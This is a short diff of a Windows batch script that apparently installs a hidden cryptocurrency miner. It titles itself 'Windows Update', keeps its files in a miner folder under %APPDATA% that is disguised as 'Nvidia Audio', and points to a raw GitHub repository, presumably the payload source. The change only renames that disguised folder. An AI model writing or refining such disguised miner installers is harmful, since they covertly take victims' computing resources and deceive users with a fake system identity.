@@ -1,6 +1,6 @@
 @echo off
 title Windows Update
-set "MINER_DIR=%APPDATA%\Nvidia Audio"
+set "MINER_DIR=%APPDATA%\NvidiaAudio"
 set "LOG=%MINER_DIR%\install.log"
 set "REPO=https://github.com/d3lph1nator/delpin4ik/raw/main"
 
